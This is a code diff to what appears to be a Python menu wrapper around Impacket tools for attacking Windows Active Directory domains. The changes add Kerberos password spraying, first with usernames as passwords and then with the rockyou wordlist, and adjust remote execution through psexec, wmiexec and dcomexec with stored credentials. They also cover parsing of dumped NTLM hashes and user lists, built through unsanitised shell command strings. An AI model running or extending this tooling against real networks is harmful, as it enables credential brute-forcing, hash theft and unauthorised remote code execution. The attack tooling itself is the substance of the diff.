@@ -150,14 +150,14 @@ def display():
    if NTM == "EMPTY              ":
       print(colored(NTM[:COL1],'yellow'), end=' ')
    else:
-      print(colored(NTM[:COL1],'red'), end=' ')
+      print(colored(NTM[:COL1],'blue'), end=' ')
    print('\u2551', end=' ')
    print(colored(SH4,'blue'), end=' ')
    print(colored(SHA4,'blue'), end=' ')
    print('\u2551', end=' ')
    print(colored(US[4],'blue'), end=' ')
    print(colored(PA[4],'blue'), end=' ')
-   print('\u2551')   
+   print('\u2551')
 
    print('\u2551' + " DOMAIN NAME  " + '\u2502', end=' ')
    if DOM == "EMPTY              ":
@@ -176,7 +176,7 @@ def display():
    if SID == "EMPTY              ":
       print(colored(SID[:COL1],'yellow'), end=' ')
    else:
-      print(colored(SID[:COL1],'red'), end=' ')
+      print(colored(SID[:COL1],'blue'), end=' ')
    print('\u2551', end=' ')
    print(colored(SH6,'blue'), end=' ')
    print(colored(SHA6,'blue'), end=' ')
@@ -342,8 +342,13 @@ def stage3():
          os.remove("domusers.txt")
          return
 
+      command("sort domusers.txt > domusers.tmp")
+      os.remove("domusers.txt")
+      command("mv domusers.tmp domusers.txt")
+
       count = int(linecache.getline("count.txt", 1))
       os.remove("count.txt")
+      os.remove("users.txt")
 
       for x in range(0, MAX):
          US[x] = " "
@@ -351,7 +356,10 @@ def stage3():
 
       for x in range(0, count):
          temp = linecache.getline("domusers.txt", x + 1)
-         temp1,temp2,temp3 = temp.split(":")
+         try:
+            temp1,temp2,temp3 = temp.split(":");
+         except ValueError:
+            temp2 = "Error..."
          US[x] = temp2
          US[x] = US[x].replace("[","")
          US[x] = US[x].replace("]","")
@@ -360,6 +368,7 @@ def stage3():
 
          if len(US[x]) < COL4:
             US[x] = padding(US[x], COL3)			# Populate new values.
+         command("echo " + US[x] + " >> users.txt")
 
       if US[12][:1] != " ": US[11] = "Some users are not shown!!"
       os.remove("domusers.txt")
@@ -951,7 +960,7 @@ while True:
 # -------------------------------------------------------------------------------------
 
    if selection == '24':
-      command(PATH + "dcomexec.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":'" + PAS.rstrip(" ") +"'@" + TIP.rstrip(" ") + " " + CMD.rstrip(" "))
+      command(PATH + "dcomexec.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":'" + PAS.rstrip(" ") +"'@" + TIP.rstrip(" ") + CMD.rstrip(" "))
       prompt()
 
 # ------------------------------------------------------------------------------------- 
@@ -963,90 +972,94 @@ while True:
 # -------------------------------------------------------------------------------------
 
    if selection == '25':
-      command(PATH + "psexec.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":'" + PAS.rstrip(" ") +"'@" + TIP.rstrip(" ") + " cmd.exe > SHARES.tmp")
-      command("cat SHARES.tmp")    
-      command("sed -i '1,3d' SHARES.tmp")
-      command("sed -i -e 's/share //g' SHARES.tmp")
 
-      SH0  = linecache.getline('SHARES.tmp', 1)
-      SH1  = linecache.getline('SHARES.tmp', 2)
-      SH2  = linecache.getline('SHARES.tmp', 3)
-      SH3  = linecache.getline('SHARES.tmp', 4)
-      SH4  = linecache.getline('SHARES.tmp', 5)
-      SH5  = linecache.getline('SHARES.tmp', 6)
-      SH6  = linecache.getline('SHARES.tmp', 7)
-      SH7  = linecache.getline('SHARES.tmp', 8)
-      SH8  = linecache.getline('SHARES.tmp', 9)
-      SH9  = linecache.getline('SHARES.tmp', 10)
-      SH10 = linecache.getline('SHARES.tmp', 11)
-      SH11 = linecache.getline('SHARES.tmp', 12)
+      if USR.rstrip(" ") != "Administrator":
+         command(PATH + "psexec.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":'" + PAS.rstrip(" ") +"'@" + TIP.rstrip(" ") + " > SHARES.tmp")
+         command("cat SHARES.tmp")    
+         command("sed -i '1,3d' SHARES.tmp")
+         command("sed -i -e 's/share //g' SHARES.tmp")
 
-      SH0  = SH0.lstrip("[-] ")
-      SH1  = SH1.lstrip("[-] ")
-      SH2  = SH2.lstrip("[-] ")
-      SH3  = SH3.lstrip("[-] ")
-      SH4  = SH4.lstrip("[-] ")
-      SH5  = SH5.lstrip("[-] ")
-      SH6  = SH6.lstrip("[-] ")
-      SH7  = SH7.lstrip("[-] ")
-      SH8  = SH8.lstrip("[-] ")
-      SH9  = SH9.lstrip("[-] ")
-      SH10 = SH10.lstrip("[-] ")
-      SH11 = SH11.lstrip("[-] ")
+         SH0  = linecache.getline('SHARES.tmp', 1)
+         SH1  = linecache.getline('SHARES.tmp', 2)
+         SH2  = linecache.getline('SHARES.tmp', 3)
+         SH3  = linecache.getline('SHARES.tmp', 4)
+         SH4  = linecache.getline('SHARES.tmp', 5)
+         SH5  = linecache.getline('SHARES.tmp', 6)
+         SH6  = linecache.getline('SHARES.tmp', 7)
+         SH7  = linecache.getline('SHARES.tmp', 8)
+         SH8  = linecache.getline('SHARES.tmp', 9)
+         SH9  = linecache.getline('SHARES.tmp', 10)
+         SH10 = linecache.getline('SHARES.tmp', 11)
+         SH11 = linecache.getline('SHARES.tmp', 12)
 
-      SH0  = SH0.replace("'", "")
-      SH1  = SH1.replace("'", "")
-      SH2  = SH2.replace("'", "")
-      SH3  = SH3.replace("'", "")
-      SH4  = SH4.replace("'", "")
-      SH5  = SH5.replace("'", "")
-      SH6  = SH6.replace("'", "")
-      SH7  = SH7.replace("'", "")
-      SH8  = SH8.replace("'", "")
-      SH9  = SH9.replace("'", "")
-      SH10 = SH10.replace("'", "")
-      SH11 = SH11.replace("'", "")
+         SH0  = SH0.lstrip("[-] ")
+         SH1  = SH1.lstrip("[-] ")
+         SH2  = SH2.lstrip("[-] ")
+         SH3  = SH3.lstrip("[-] ")
+         SH4  = SH4.lstrip("[-] ")
+         SH5  = SH5.lstrip("[-] ")
+         SH6  = SH6.lstrip("[-] ")
+         SH7  = SH7.lstrip("[-] ")
+         SH8  = SH8.lstrip("[-] ")
+         SH9  = SH9.lstrip("[-] ")
+         SH10 = SH10.lstrip("[-] ")
+         SH11 = SH11.lstrip("[-] ")
 
-      if SH0  !="":  SH0,SHA0   = SH0.split("is")
-      if SH1  !="":  SH1,SHA1   = SH1.split("is")
-      if SH2  !="":  SH2,SHA2   = SH2.split("is")
-      if SH3  !="":  SH3,SHA3   = SH3.split("is")
-      if SH4  !="":  SH4,SHA4   = SH4.split("is")
-      if SH5  !="":  SH5,SHA5   = SH5.split("is")
-      if SH6  !="":  SH6,SHA6   = SH6.split("is")
-      if SH7  !="":  SH7,SHA7   = SH7.split("is")
-      if SH8  !="":  SH8,SHA8   = SH8.split("is")
-      if SH9  !="":  SH9,SHA9   = SH9.split("is")
-      if SH10 !="": SH10,SHA10 = SH10.split("is")
-      if SH11 !="": SH11,SHA11 = SH11.split("is")
+         SH0  = SH0.replace("'", "")
+         SH1  = SH1.replace("'", "")
+         SH2  = SH2.replace("'", "")
+         SH3  = SH3.replace("'", "")
+         SH4  = SH4.replace("'", "")
+         SH5  = SH5.replace("'", "")
+         SH6  = SH6.replace("'", "")
+         SH7  = SH7.replace("'", "")
+         SH8  = SH8.replace("'", "")
+         SH9  = SH9.replace("'", "")
+         SH10 = SH10.replace("'", "")
+         SH11 = SH11.replace("'", "")
 
-      SH0   = dpadding(SH0, COL2)
-      SH1   = dpadding(SH1, COL2)
-      SH2   = dpadding(SH2, COL2)
-      SH3   = dpadding(SH3, COL2)
-      SH4   = dpadding(SH4, COL2)
-      SH5   = dpadding(SH5, COL2)
-      SH6   = dpadding(SH6, COL2)
-      SH7   = dpadding(SH7, COL2)
-      SH8   = dpadding(SH8, COL2)
-      SH9   = dpadding(SH9, COL2)
-      SH10  = dpadding(SH10, COL2)
-      SH11  = dpadding(SH11, COL2)
+         if SH0  !="":  SH0,SHA0   = SH0.split("is")
+         if SH1  !="":  SH1,SHA1   = SH1.split("is")
+         if SH2  !="":  SH2,SHA2   = SH2.split("is")
+         if SH3  !="":  SH3,SHA3   = SH3.split("is")
+         if SH4  !="":  SH4,SHA4   = SH4.split("is")
+         if SH5  !="":  SH5,SHA5   = SH5.split("is")
+         if SH6  !="":  SH6,SHA6   = SH6.split("is")
+         if SH7  !="":  SH7,SHA7   = SH7.split("is")
+         if SH8  !="":  SH8,SHA8   = SH8.split("is")
+         if SH9  !="":  SH9,SHA9   = SH9.split("is")
+         if SH10 !="": SH10,SHA10 = SH10.split("is")
+         if SH11 !="": SH11,SHA11 = SH11.split("is")
 
-      SHA0  = padding(SHA0, COL2)
-      SHA1  = padding(SHA1, COL2)
-      SHA2  = padding(SHA2, COL2)
-      SHA3  = padding(SHA3, COL2)
-      SHA4  = padding(SHA4, COL2)
-      SHA5  = padding(SHA5, COL2)
-      SHA6  = padding(SHA6, COL2)
-      SHA7  = padding(SHA7, COL2)
-      SHA8  = padding(SHA8, COL2)
-      SHA9  = padding(SHA9, COL2)
-      SHA10 = padding(SHA10, COL2)
-      SHA11 = padding(SHA11, COL2)
+         SH0   = dpadding(SH0, COL2)
+         SH1   = dpadding(SH1, COL2)
+         SH2   = dpadding(SH2, COL2)
+         SH3   = dpadding(SH3, COL2)
+         SH4   = dpadding(SH4, COL2)
+         SH5   = dpadding(SH5, COL2)
+         SH6   = dpadding(SH6, COL2)
+         SH7   = dpadding(SH7, COL2)
+         SH8   = dpadding(SH8, COL2)
+         SH9   = dpadding(SH9, COL2)
+         SH10  = dpadding(SH10, COL2)
+         SH11  = dpadding(SH11, COL2)
 
-      os.remove("SHARES.tmp")
+         SHA0  = padding(SHA0, COL2)
+         SHA1  = padding(SHA1, COL2)
+         SHA2  = padding(SHA2, COL2)
+         SHA3  = padding(SHA3, COL2)
+         SHA4  = padding(SHA4, COL2)
+         SHA5  = padding(SHA5, COL2)
+         SHA6  = padding(SHA6, COL2)
+         SHA7  = padding(SHA7, COL2)
+         SHA8  = padding(SHA8, COL2)
+         SHA9  = padding(SHA9, COL2)
+         SHA10 = padding(SHA10, COL2)
+         SHA11 = padding(SHA11, COL2)
+
+         os.remove("SHARES.tmp")
+      else:
+         command(PATH + "psexec.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":'" + PAS.rstrip(" ") +"'@" + TIP.rstrip(" "))
       prompt()
 
 # ------------------------------------------------------------------------------------- 
@@ -1070,7 +1083,7 @@ while True:
 # -------------------------------------------------------------------------------------
 
    if selection == '27':
-      command(PATH + "wmiexec.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":'" + PAS.rstrip(" ") +"'@" + TIP.rstrip(" ") + " " + CMD.rstrip(" "))
+      command(PATH + "wmiexec.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":'" + PAS.rstrip(" ") +"'@" + TIP.rstrip(" "))
       prompt()
 
 # ------------------------------------------------------------------------------------- 
@@ -1320,7 +1333,12 @@ while True:
 # -------------------------------------------------------------------------------------
 
    if selection =='42':
-      command(PATH + "kerbrute.py -domain " + DOM.rstrip(" ") + " -users users.txt -passwords /usr/share/wordlists/rockyou.txt")
+      print("\n[+] Trying all usernames with matching passwords first...")
+      command(PATH + "kerbrute.py -domain " + DOM.rstrip(" ") + " -users users.txt  -passwords users.txt -outputfile passwords.txt")
+      test = os.path.exists("passwords.txt")
+      if test != 1:
+         print("\n[+] Now trying all users with random passwords...")
+         command(PATH + "kerbrute.py -domain " + DOM.rstrip(" ") + " -users users.txt -passwords /usr/share/wordlists/rockyou.txt")
       prompt()
 
 # ------------------------------------------------------------------------------------- 
@@ -1586,13 +1604,17 @@ while True:
          data = data.replace(":::","")
          temp = DOM.rstrip(" ") + "\\"
          data = data.replace(temp,"")
-         temp = DOM.rstrip(" ") + "LOCAL\\"
+         temp = DOM.rstrip(" ") + ".LOCAL\\"
          data = data.replace(temp,"")
-         get1,get2,get3,get4 = data.split(":") 
+         try:
+            get1,get2,get3,get4 = data.split(":") 
+         except ValueError:
+            get1 = "Error..."
+            get4 = "Error..."
          get1 = get1.rstrip("\n")
          get4 = get4.rstrip("\n")
 
-         print("[+] Found User ", get1)
+         print("[+] Found User", get1)
          US[x] = get1[:COL3]
          PA[x] = get4[:COL4]
          if len(US[x]) < COL3: US[x] = padding(US[x], COL3) 			# USER
@@ -1600,6 +1622,8 @@ while True:
 
       for z in range(0, MAX):
          if US[z].rstrip(" ") == USR.rstrip(" "): NTM = PA[z]			# RESET DISPLAY HASH
+
+      if US[12][:1] != " ": US[11] = "Some users are not shown!!"
       os.remove("SECRETS.tmp")
       prompt()
 
